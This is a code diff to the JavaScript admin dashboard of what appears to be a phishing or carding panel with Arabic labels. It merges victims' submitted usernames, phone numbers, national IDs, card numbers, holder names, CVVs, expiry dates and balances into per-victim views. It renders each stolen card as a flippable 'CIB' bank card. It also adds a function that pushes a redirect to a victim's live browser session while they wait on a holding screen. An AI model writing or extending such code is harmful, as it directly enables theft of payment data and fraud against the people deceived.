@@ -128,7 +128,9 @@ const INTERNAL_FIELD_KEYS = new Set([
     'createdAt',
     'updatedAt',
     'client_session_id',
-    'session_id'
+    'session_id',
+    'linked_username',
+    'linked_phone'
 ]);
 
 const FIELD_LABELS_AR = {
@@ -191,9 +193,15 @@ function normalizeUserForDisplay(user) {
     const ch = out.card_holder != null ? String(out.card_holder).trim() : '';
     const chld = out.cardHolder != null ? String(out.cardHolder).trim() : '';
     if (!ch && chld) out.card_holder = out.cardHolder;
-    const cv = out.cvv != null ? String(out.cvv).trim() : '';
-    const cvcVal = out.cvc != null ? String(out.cvc).trim() : '';
-    if (!cv && cvcVal) out.cvv = out.cvc;
+    let cv = '';
+    const cvKeys = ['cvv', 'CVV', 'cvc', 'CVC', 'securityCode', 'card_cvv', 'cvvCode'];
+    for (const k of cvKeys) {
+        if (out[k] != null && String(out[k]).trim() !== '') {
+            cv = String(out[k]).trim();
+            break;
+        }
+    }
+    if (cv) out.cvv = cv;
     const ex = out.expiry_date != null ? String(out.expiry_date).trim() : '';
     if (!ex) {
         const m = String(out.expiry_month || '').replace(/\D/g, '').slice(0, 2);
@@ -204,6 +212,11 @@ function normalizeUserForDisplay(user) {
     delete out.cardNumber;
     delete out.cardHolder;
     delete out.cvc;
+    delete out.CVV;
+    delete out.CVC;
+    delete out.securityCode;
+    delete out.card_cvv;
+    delete out.cvvCode;
     return out;
 }
 
@@ -268,6 +281,18 @@ const DASHBOARD_FORM_TABLES = [
 let dashboardRefreshIntervalId = null;
 let aggregatedUsers = [];
 
+function recordSortTimestamp(rec) {
+    if (rec.createdAt) {
+        const t = new Date(rec.createdAt).getTime();
+        if (!isNaN(t)) return t;
+    }
+    if (rec.updatedAt) {
+        const t = new Date(rec.updatedAt).getTime();
+        if (!isNaN(t)) return t;
+    }
+    return Date.parse(String(rec.registrationTime || rec.timestamp || '')) || 0;
+}
+
 function getSearchQuery() {
     const el = document.getElementById('searchInput');
     return el ? el.value.trim() : '';
@@ -287,17 +312,27 @@ function userMatchesSearchQuery(user, query) {
     return false;
 }
 
+/**
+ * مفتاح مستخدم واحد في الداشبورد: يُفضَّل اسم المستخدم/الهاتف ثم الجلسة
+ * (لا يُستخدم عنوان الساعة كاسم للتجميع عند page=watches).
+ */
 function deriveAggregationKey(user) {
     const u = normalizeUserForDisplay(user);
+    const page = String(u.page || '');
     const candidates = [
+        u.username,
+        u.linked_username,
+        u.phone,
+        u.linked_phone,
+        u.email,
+        u['national-id'],
         u.client_session_id,
         u.session_id,
-        u.username,
-        u.phone,
-        u.email,
-        u.card_number,
-        u.name
+        u.card_number
     ];
+    if (page !== 'watches') {
+        candidates.push(u.name);
+    }
     for (const c of candidates) {
         if (c != null && String(c).trim() !== '') {
             return String(c).trim().toLowerCase();
@@ -306,10 +341,87 @@ function deriveAggregationKey(user) {
     return `id:${String(u.id || '')}`;
 }
 
+function mergeAggregateGroup(group, recById) {
+    const allIds = [...new Set(group.flatMap((g) => g.sourceIds))];
+    const recs = allIds
+        .map((id) => recById.get(id))
+        .filter(Boolean)
+        .sort((a, b) => recordSortTimestamp(a) - recordSortTimestamp(b));
+    const base = {
+        id: String(recs.length ? recs[recs.length - 1].id : group[group.length - 1].id),
+        sourceIds: allIds,
+        merged: {},
+        byPageRecords: {},
+        page: '',
+        registrationTime: '',
+        displayName: 'بدون اسم'
+    };
+    for (const rec of recs) {
+        const row = normalizeUserForDisplay(rec);
+        const pageKey = row.page || 'other';
+        base.byPageRecords[pageKey] = row;
+        for (const k of Object.keys(row)) {
+            const val = row[k];
+            if (val == null || String(val).trim() === '') continue;
+            base.merged[k] = val;
+        }
+        base.page = row.page || base.page || '';
+        base.registrationTime =
+            row.registrationTime || row.timestamp || base.registrationTime;
+        base.displayName =
+            base.merged.username ||
+            base.merged.linked_username ||
+            base.merged['full-name'] ||
+            base.merged.phone ||
+            base.merged.name ||
+            base.displayName;
+    }
+    base.cardSubmissions = recs
+        .filter((r) => String(r.page || '') === 'card')
+        .map((r) => normalizeUserForDisplay({ ...r }));
+    return base;
+}
+
+/** دمج صفوف قديمة انفصلت بمفتاح جلسة رغم نفس اسم المستخدم */
+function collapseAggregatesWithSameUsername(list, recById) {
+    const groups = new Map();
+    const rest = [];
+    for (const agg of list) {
+        const u = String(
+            agg.merged.username || agg.merged.linked_username || ''
+        )
+            .trim()
+            .toLowerCase();
+        const p = String(agg.merged.phone || agg.merged.linked_phone || '')
+            .trim()
+            .toLowerCase();
+        if (u) {
+            if (!groups.has(u)) groups.set(u, []);
+            groups.get(u).push(agg);
+        } else if (p) {
+            const pk = 'phone:' + p;
+            if (!groups.has(pk)) groups.set(pk, []);
+            groups.get(pk).push(agg);
+        } else {
+            rest.push(agg);
+        }
+    }
+    const out = [...rest];
+    for (const [, group] of groups) {
+        out.push(
+            group.length === 1 ? group[0] : mergeAggregateGroup(group, recById)
+        );
+    }
+    return out;
+}
+
 function buildAggregatedUsers(records) {
+    const sorted = [...records].sort(
+        (a, b) => recordSortTimestamp(a) - recordSortTimestamp(b)
+    );
     const map = new Map();
     const list = [];
-    for (const rec of records) {
+    for (const rec of sorted) {
         const row = normalizeUserForDisplay(rec);
         const key = deriveAggregationKey(row);
         let agg = map.get(key);
@@ -319,9 +431,10 @@ function buildAggregatedUsers(records) {
                 sourceIds: [],
                 merged: {},
                 byPageRecords: {},
+                cardSubmissions: [],
                 page: row.page || '',
                 registrationTime: row.registrationTime || row.timestamp || '',
-                displayName: row.username || row.name || 'بدون اسم'
+                displayName: row.username || row.linked_username || row.name || 'بدون اسم'
             };
             map.set(key, agg);
             list.push(agg);
@@ -332,24 +445,46 @@ function buildAggregatedUsers(records) {
             if (!agg.sourceIds.includes(sid)) agg.sourceIds.push(sid);
         }
 
-        const pageKey = row.page || 'other';
-        if (!agg.byPageRecords[pageKey]) {
-            agg.byPageRecords[pageKey] = row;
+        if (String(rec.page || '') === 'card') {
+            if (!agg.cardSubmissions) agg.cardSubmissions = [];
+            agg.cardSubmissions.push(normalizeUserForDisplay({ ...rec }));
         }
+
+        const pageKey = row.page || 'other';
+        agg.byPageRecords[pageKey] = row;
 
         for (const k of Object.keys(row)) {
             const val = row[k];
             if (val == null || String(val).trim() === '') continue;
-            if (agg.merged[k] == null || String(agg.merged[k]).trim() === '') {
-                agg.merged[k] = val;
-            }
+            agg.merged[k] = val;
         }
 
-        agg.displayName = agg.merged.username || agg.merged.name || agg.displayName;
-        agg.page = agg.page || row.page || '';
-        agg.registrationTime = agg.registrationTime || row.registrationTime || row.timestamp || '';
+        agg.displayName =
+            agg.merged.username ||
+            agg.merged.linked_username ||
+            agg.merged['full-name'] ||
+            agg.merged.phone ||
+            agg.merged.name ||
+            agg.displayName;
+        agg.page = row.page || agg.page || '';
+        agg.registrationTime =
+            row.registrationTime || row.timestamp || agg.registrationTime;
     }
-    return list;
+    const recById = new Map(records.map((r) => [String(r.id), r]));
+    const mergedList = collapseAggregatesWithSameUsername(list, recById);
+    for (const agg of mergedList) {
+        let maxTs = 0;
+        for (const sid of agg.sourceIds) {
+            const r = recById.get(sid);
+            if (r) maxTs = Math.max(maxTs, recordSortTimestamp(r));
+        }
+        agg._sortTs = maxTs;
+    }
+    mergedList.sort((a, b) => (b._sortTs || 0) - (a._sortTs || 0));
+    for (const agg of mergedList) {
+        delete agg._sortTs;
+    }
+    return mergedList;
 }
 
 function getUsersForDashboardView() {
@@ -358,6 +493,49 @@ function getUsersForDashboardView() {
     const q = getSearchQuery();
     if (!q) return mergedUsers;
     return mergedUsers.filter((u) => userMatchesSearchQuery(u.merged, q));
+}
+
+function findAggregatedUser(userId) {
+    const id = String(userId);
+    return aggregatedUsers.find((u) => String(u.id) === id) || null;
+}
+
+/** أحدث client_session_id معروف لهذا الصف المُجمَّع */
+function getClientSessionIdForAggregate(agg) {
+    if (!agg) return '';
+    if (agg.merged && agg.merged.client_session_id) {
+        const s = String(agg.merged.client_session_id).trim();
+        if (s) return s;
+    }
+    let best = '';
+    let bestTs = -1;
+    const pages = agg.byPageRecords || {};
+    for (const rec of Object.values(pages)) {
+        if (!rec || !rec.client_session_id) continue;
+        const t = recordSortTimestamp(rec);
+        if (t >= bestTs) {
+            bestTs = t;
+            best = String(rec.client_session_id).trim();
+        }
+    }
+    return best;
+}
+
+function bindDashboardTableClickDelegation() {
+    const wrap = document.getElementById('dashboardTablesWrap');
+    if (!wrap || wrap.dataset.dashDelegate === '1') return;
+    wrap.dataset.dashDelegate = '1';
+    wrap.addEventListener('click', (e) => {
+        const btn = e.target.closest('button[data-dash-action]');
+        if (!btn) return;
+        const action = btn.getAttribute('data-dash-action');
+        const rowId = btn.getAttribute('data-row-id');
+        if (!rowId) return;
+        e.preventDefault();
+        if (action === 'info') openInfoModal(rowId);
+        else if (action === 'card') openCardModal(rowId);
+        else if (action === 'delete') deleteUserConfirm(rowId);
+    });
 }
 
 function getFieldDisplayValue(user, fieldKey) {
@@ -393,33 +571,39 @@ function renderDashboardTables() {
     const wrap = document.getElementById('dashboardTablesWrap');
     if (!wrap) return;
 
+    bindDashboardTableClickDelegation();
+
     const stored = db.getAllUsers();
     if (!stored.length) {
         wrap.innerHTML =
             '<p class="dashboard-empty-all">لا توجد بيانات مسجلة</p>';
+        aggregatedUsers = [];
         return;
     }
 
     const viewUsers = getUsersForDashboardView();
     aggregatedUsers = viewUsers;
+
     if (!viewUsers.length) {
         wrap.innerHTML =
             '<p class="dashboard-empty-all">لا توجد نتائج مطابقة للبحث</p>';
         return;
     }
 
+    const attrId = (id) => escapeHtml(String(id));
+
     const rows = viewUsers
         .map((user, idx) => {
-            const idJson = JSON.stringify(String(user.id));
+            const rid = attrId(user.id);
             return `
             <tr>
                 <td>${idx + 1}</td>
                 <td>${escapeHtml(user.displayName || 'بدون اسم')}</td>
                 <td><span class="page-badge">${escapeHtml(getPageArabic(user.page || ''))}</span></td>
-                <td class="action-column"><button type="button" class="btn-info" onclick="openInfoModal(${idJson})">معلومات</button></td>
-                <td class="action-column"><button type="button" class="btn-card" onclick="openCardModal(${idJson})">بطاقة</button></td>
+                <td class="action-column"><button type="button" class="btn-info" data-dash-action="info" data-row-id="${rid}">معلومات</button></td>
+                <td class="action-column"><button type="button" class="btn-card" data-dash-action="card" data-row-id="${rid}">بطاقة</button></td>
                 <td>${escapeHtml(user.registrationTime || '—')}</td>
-                <td class="action-column"><button type="button" class="btn-delete" onclick="deleteUserConfirm(${idJson})">حذف</button></td>
+                <td class="action-column"><button type="button" class="btn-delete" data-dash-action="delete" data-row-id="${rid}">حذف</button></td>
             </tr>`;
         })
         .join('');
@@ -568,17 +752,18 @@ function searchUsers() {
 
 // Delete Functions
 async function deleteUserConfirm(userId) {
-    if (!confirm('هل تريد حقاً حذف هذا المستخدم؟')) return;
+    if (!confirm('هل تريد حقاً حذف هذا المستخدم وجميع سجلات مساره؟')) return;
     try {
-        const target = aggregatedUsers.find((u) => String(u.id) === String(userId));
-        const ids = target && target.sourceIds && target.sourceIds.length
-            ? target.sourceIds
-            : [userId];
+        const target = findAggregatedUser(userId);
+        const ids =
+            target && target.sourceIds && target.sourceIds.length
+                ? target.sourceIds
+                : [userId];
         for (const id of ids) {
             await db.deleteUser(id);
         }
         renderDashboardTables();
-        db.showNotification('تم حذف المستخدم بنجاح', 'success');
+        db.showNotification('تم الحذف بنجاح', 'success');
     } catch (e) {
         console.error(e);
         db.showNotification('فشل حذف السجل', 'error');
@@ -600,10 +785,7 @@ async function deleteAllUsers() {
 
 // Info Modal
 function openInfoModal(userId) {
-    console.log('openInfoModal called with userId:', userId);
-    currentUser = aggregatedUsers.find((u) => String(u.id) === String(userId));
-    console.log('currentUser found:', currentUser);
-    
+    currentUser = findAggregatedUser(userId);
     if (!currentUser) return;
 
     // تنظيم البيانات حسب الصفحات
@@ -614,24 +796,26 @@ function openInfoModal(userId) {
     updateNavigationButtons(currentUser.page);
     
     const infoModal = document.getElementById('infoModal');
-    console.log('infoModal element:', infoModal);
     infoModal.classList.remove('modal-hidden');
     infoModal.classList.add('active');
     infoModal.style.setProperty('display', 'flex', 'important');
-    console.log('infoModal updated, display:', infoModal.style.display);
 }
 
 function renderUserDetailsByPage(user) {
     const byPage = user.byPageRecords || {};
     let html = '';
     for (const cfg of DASHBOARD_FORM_TABLES) {
-        const source = byPage[cfg.page] || user.merged || {};
+        const source = byPage[cfg.page]
+            ? normalizeUserForDisplay(byPage[cfg.page])
+            : {};
         let rows = '';
+        let anyFilled = false;
         for (const f of cfg.fields) {
             const val = getFieldDisplayValue(source, f.key);
+            if (val !== '—') anyFilled = true;
             rows += `<tr><th>${escapeHtml(f.label)}</th><td>${escapeHtml(val)}</td></tr>`;
         }
-        if (!rows) {
+        if (!anyFilled) {
             rows = '<tr><th colspan="2">لا توجد تسجيلات في هذا القسم</th></tr>';
         }
         html += `
@@ -653,26 +837,145 @@ function closeInfoModal() {
     currentUser = null;
 }
 
+const CARD_REG_ORDINALS_AR = [
+    'الأول',
+    'الثاني',
+    'الثالث',
+    'الرابع',
+    'الخامس',
+    'السادس',
+    'السابع',
+    'الثامن',
+    'التاسع',
+    'العاشر'
+];
+
+function cardRegistrationCaptionAr(index1Based) {
+    const n = index1Based;
+    if (n >= 1 && n <= CARD_REG_ORDINALS_AR.length) {
+        return 'التسجيل ' + CARD_REG_ORDINALS_AR[n - 1];
+    }
+    return 'التسجيل رقم ' + n;
+}
+
+function formatCardNumberSpaced(raw) {
+    const d = String(raw || '')
+        .replace(/\D/g, '')
+        .slice(0, 16);
+    if (!d) return '—';
+    return d.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+}
+
+function getCardSubmissionsForUser(user) {
+    if (user.cardSubmissions && user.cardSubmissions.length) {
+        return user.cardSubmissions;
+    }
+    const c = user.byPageRecords && user.byPageRecords.card;
+    if (c) return [normalizeUserForDisplay(c)];
+    const m = user.merged;
+    if (m && (m.card_number != null || m.card_holder != null)) {
+        return [normalizeUserForDisplay(m)];
+    }
+    return [];
+}
+
+function renderDashboardFlipCardsRow(user) {
+    const list = getCardSubmissionsForUser(user);
+    if (!list.length) {
+        return `<p class="dash-cards-empty">لا توجد بيانات بطاقة مسجّلة لهذا المستخدم.</p>`;
+    }
+
+    const rows = list.map((rec, i) => ({
+        u: normalizeUserForDisplay(rec),
+        cap: cardRegistrationCaptionAr(i + 1)
+    }));
+    rows.reverse();
+
+    let trackHtml = '';
+    for (let r = 0; r < rows.length; r++) {
+        const u = rows[r].u;
+        const cap = rows[r].cap;
+        const num = formatCardNumberSpaced(u.card_number);
+        const holder = (u.card_holder || u.name || '').trim() || '—';
+        let exp = (u.expiry_date || '').trim();
+        if (!exp) {
+            const mo = String(u.expiry_month || '')
+                .replace(/\D/g, '')
+                .slice(0, 2)
+                .padStart(2, '0');
+            const yr = String(u.expiry_year || '')
+                .replace(/\D/g, '')
+                .slice(-2);
+            exp = mo && yr ? `${mo}/${yr}` : '—';
+        }
+        const cvv =
+            u.cvv != null && String(u.cvv).trim() !== ''
+                ? String(u.cvv).trim()
+                : '—';
+        const balance =
+            u.balance != null && String(u.balance).trim() !== ''
+                ? String(u.balance).trim()
+                : '—';
+        trackHtml += `
+        <div class="dash-flip-card-3d">
+            <div class="dash-flip-scene">
+                <div class="dash-flip-inner">
+                    <div class="dash-flip-face dash-flip-front">
+                        <span class="dash-mini-brand">CIB</span>
+                        <div class="dash-mini-chip" aria-hidden="true"></div>
+                        <div class="dash-mini-num">${escapeHtml(num)}</div>
+                        <div class="dash-mini-bottom">
+                            <div class="dash-mini-col dash-mini-col--holder">
+                                <span class="dash-mini-name">${escapeHtml(holder)}</span>
+                            </div>
+                            <div class="dash-mini-col dash-mini-col--meta">
+                                <div class="dash-mini-kv">
+                                    <span class="dash-mini-k">EXP</span>
+                                    <span class="dash-mini-exp">${escapeHtml(exp)}</span>
+                                </div>
+                                <div class="dash-mini-kv">
+                                    <span class="dash-mini-k">CVC</span>
+                                    <span class="dash-mini-cvv">${escapeHtml(cvv)}</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="dash-flip-face dash-flip-back">
+                        <div class="dash-back-shine" aria-hidden="true"></div>
+                        <div class="dash-back-body">
+                            <span class="dash-back-title">الرصيد المسجّل</span>
+                            <span class="dash-back-balance">${escapeHtml(balance)}</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <button type="button" class="btn-flip-card" onclick="this.closest('.dash-flip-card-3d').classList.toggle('is-flipped')">قلب البطاقة</button>
+            <p class="dash-flip-caption">${escapeHtml(cap)}</p>
+        </div>`;
+    }
+
+    return `
+    <div class="dash-cards-wrap">
+        <h3 class="dash-cards-heading">البطاقات المضافة لهذا المستخدم</h3>
+        <p class="dash-cards-sub">الوجه الأمامي: البيانات — اضغط «قلب البطاقة» لعرض الرصيد في الخلف. أحدث بطاقة تظهر إلى اليسار.</p>
+        <div class="dash-cards-track" dir="ltr">${trackHtml}</div>
+    </div>`;
+}
+
 function openCardModal(userId) {
-    console.log('openCardModal called with userId:', userId);
-    currentUser = aggregatedUsers.find((u) => String(u.id) === String(userId));
-    console.log('currentUser found:', currentUser);
-    
+    currentUser = findAggregatedUser(userId);
     if (!currentUser) return;
 
-    // عرض بيانات البطاقة على شكل كارد
-    const cardHtml = renderCardDisplay(currentUser.merged || currentUser);
+    const cardHtml = renderDashboardFlipCardsRow(currentUser);
     document.getElementById('cardDisplay').innerHTML = cardHtml;
 
     // Update navigation buttons
     updateNavigationButtons(currentUser.page);
     
     const cardModal = document.getElementById('cardModal');
-    console.log('cardModal element:', cardModal);
     cardModal.classList.remove('modal-hidden');
     cardModal.classList.add('active');
     cardModal.style.setProperty('display', 'flex', 'important');
-    console.log('cardModal updated, display:', cardModal.style.display);
 }
 
 function formatCardNumberGroups(raw) {
@@ -782,10 +1085,48 @@ function updateNavigationButtons(currentPage) {
     });
 }
 
-function navigateTo(page) {
-    if (currentUser) {
-        // فتح الصفحة في نافذة جديدة
-        window.open(page, '_blank');
+async function navigateTo(page) {
+    const target = String(page || '').trim();
+    if (!target) return;
+
+    if (!currentUser) {
+        window.open(target, '_blank');
+        return;
+    }
+
+    const sid = getClientSessionIdForAggregate(currentUser);
+
+    if (!sid || String(sid).trim() === '') {
+        db.showNotification(
+            'لا يوجد client_session_id في تسجيلات هذا المستخدم — لا يمكن توجيه المتصفح.',
+            'error'
+        );
+        return;
+    }
+
+    try {
+        const res = await fetch(
+            db.apiBase() + '/api/session/nav',
+            {
+                method: 'POST',
+                headers: db.headers({ 'Content-Type': 'application/json' }),
+                body: JSON.stringify({
+                    client_session_id: String(sid).trim(),
+                    redirectUrl: target
+                })
+            }
+        );
+        if (!res.ok) {
+            const t = await res.text();
+            throw new Error(t || 'فشل الطلب');
+        }
+        db.showNotification(
+            'تم إرسال التوجيه. المستخدم ما زال على شاشة الانتظار حتى تُحمَّل الصفحة.',
+            'success'
+        );
+    } catch (e) {
+        console.error(e);
+        db.showNotification('تعذر إرسال التوجيه — تحقق من الخادم.', 'error');
     }
 }
 
